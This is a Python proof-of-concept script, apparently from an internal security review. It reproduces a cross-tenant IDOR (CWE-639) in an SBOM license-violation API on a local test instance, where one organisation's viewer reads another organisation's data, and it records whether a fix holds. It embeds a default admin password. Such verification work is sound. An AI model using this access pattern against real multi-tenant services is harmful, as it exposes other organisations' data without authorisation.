"""
PoC for SEC-001b — DO NOT RUN against production.
============================================================
Demonstrates that GET /api/licenses/releases/{release_id}/violations
allows a viewer of orgB to fetch license violations for a release
owned by orgA (CWE-639 IDOR).

Setup:
  1. As admin, create orgA + viewerA, orgB + viewerB
  2. Upload SBOM with GPL-3.0 component to orgA's release
  3. orgB has zero data
  4. Login as viewerB
  5. GET /api/licenses/releases/{orgA_release_id}/violations
  6. If response is 200 with the GPL-3.0 violation → IDOR confirmed
"""
from __future__ import annotations

import json
import os
import sys
import time
import urllib.error
import urllib.request

API     = os.environ.get("POC_API_URL",        "http://localhost:9100")
ADMIN_U = os.environ.get("POC_ADMIN_USERNAME", "admin")
ADMIN_P = os.environ.get("POC_ADMIN_PASSWORD", "sbom@2024")

STAMP = int(time.time())
ORGA_NAME = f"POC-001b-OrgA-{STAMP}"
ORGB_NAME = f"POC-001b-OrgB-{STAMP}"
VIEWERA   = f"poc-vA-{STAMP}"
VIEWERB   = f"poc-vB-{STAMP}"
PASSWORD  = "PocViewer2026!"

SBOM = {
    "bomFormat": "CycloneDX", "specVersion": "1.4", "version": 1,
    "components": [{
        "type": "library", "name": f"poc-gpl-{STAMP}", "version": "1.0.0",
        "purl": f"pkg:generic/poc-gpl-{STAMP}@1.0.0",
        "licenses": [{"license": {"id": "GPL-3.0"}}],
    }],
}


def _req(path, method="GET", body=None, token=None):
    headers = {}
    if token: headers["Authorization"] = f"Bearer {token}"
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(f"{API}{path}", data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, (json.loads(resp.read() or b"null"))
    except urllib.error.HTTPError as e:
        text = e.read().decode("utf-8", errors="replace")
        try: return e.code, json.loads(text)
        except: return e.code, text


def _upload_sbom(release_id, token):
    boundary = f"----PocBoundary{STAMP}"
    sbom_bytes = json.dumps(SBOM).encode()
    body = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="poc.cdx.json"\r\n'
            f"Content-Type: application/json\r\n\r\n").encode() + sbom_bytes + f"\r\n--{boundary}--\r\n".encode()
    req = urllib.request.Request(f"{API}/api/releases/{release_id}/sbom", data=body, method="POST",
        headers={"Authorization": f"Bearer {token}", "Content-Type": f"multipart/form-data; boundary={boundary}"})
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, json.loads(resp.read() or b"null")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")


def main():
    print(f"PoC SEC-001b - IDOR in /api/licenses/releases/{{id}}/violations")
    print(f"API: {API}\n")
    cleanup_org_ids = []
    try:
        code, body = _req("/api/auth/login", "POST", {"username": ADMIN_U, "password": ADMIN_P})
        assert code == 200, f"admin login: {code} {body}"
        admin_tok = body["access_token"]
        print("[1] admin login OK")

        code, body = _req("/api/organizations", "POST",
                          {"name": ORGA_NAME, "username": VIEWERA, "password": PASSWORD}, token=admin_tok)
        assert code in (200, 201), f"orgA: {code} {body}"
        orgA_id = body["id"]; cleanup_org_ids.append(orgA_id)
        print(f"[2a] orgA (id={orgA_id})")

        code, body = _req("/api/organizations", "POST",
                          {"name": ORGB_NAME, "username": VIEWERB, "password": PASSWORD}, token=admin_tok)
        assert code in (200, 201), f"orgB: {code} {body}"
        orgB_id = body["id"]; cleanup_org_ids.append(orgB_id)
        print(f"[2b] orgB (id={orgB_id})")

        code, body = _req(f"/api/organizations/{orgA_id}/products", "POST",
                          {"name": "poc-prod", "description": "PoC SEC-001b"}, token=admin_tok)
        assert code in (200, 201), f"product: {code} {body}"
        prodA_id = body["id"]
        code, body = _req(f"/api/products/{prodA_id}/releases", "POST",
                          {"version": "1.0.0-poc", "notes": "PoC SEC-001b"}, token=admin_tok)
        assert code in (200, 201), f"release: {code} {body}"
        relA_id = body["id"]
        print(f"[3] orgA release (id={relA_id})")

        code, body = _upload_sbom(relA_id, admin_tok)
        assert code in (200, 201), f"SBOM: {code} {body}"
        print("[4] SBOM with GPL-3.0 uploaded to orgA")

        # Login as viewerB
        code, body = _req("/api/auth/login", "POST", {"username": VIEWERB, "password": PASSWORD})
        assert code == 200, f"viewerB login: {code} {body}"
        viewerB_tok = body["access_token"]
        print("[5] viewerB logged in")

        # THE EXPLOIT: viewerB requests orgA's release violations
        code, body = _req(f"/api/licenses/releases/{relA_id}/violations", token=viewerB_tok)
        print(f"[6] viewerB GET /api/licenses/releases/{relA_id}/violations -> HTTP {code}")
        if isinstance(body, dict):
            violations = body.get("violations", [])
            print(f"    response: violations={len(violations)} entries")
            if violations:
                print(f"    first: {violations[0]}")
        else:
            print(f"    response: {body}")

        print()
        if code == 200 and isinstance(body, dict) and body.get("violations"):
            print("=" * 70)
            print(f"[IDOR CONFIRMED] viewerB read orgA's release {relA_id} violations")
            print(f"  cross-tenant license violation disclosure proven")
            print("=" * 70)
            verdict = "LEAK"
        elif code == 404:
            print("[NO LEAK] 404 — release_id is hidden from cross-tenant viewer (post-fix expected behaviour)")
            verdict = "NO_LEAK"
        elif code == 403:
            print("[PARTIAL FIX] 403 — release ownership rejected, but reveals release_id exists (oracle)")
            verdict = "PARTIAL"
        else:
            print(f"[UNCLEAR] code={code}, body={body}")
            verdict = "UNCLEAR"
        return 1 if verdict in ("LEAK", "PARTIAL") else 0
    finally:
        if cleanup_org_ids:
            try:
                code, body = _req("/api/auth/login", "POST", {"username": ADMIN_U, "password": ADMIN_P})
                if code == 200:
                    tok = body["access_token"]
                    for org_id in cleanup_org_ids:
                        c, b = _req(f"/api/organizations/{org_id}", "DELETE", token=tok)
                        print(f"[cleanup] org {org_id} -> {c}")
            except Exception as e:
                print(f"[cleanup FAIL] {e} — manual: {cleanup_org_ids}")


if __name__ == "__main__":
    sys.exit(main())
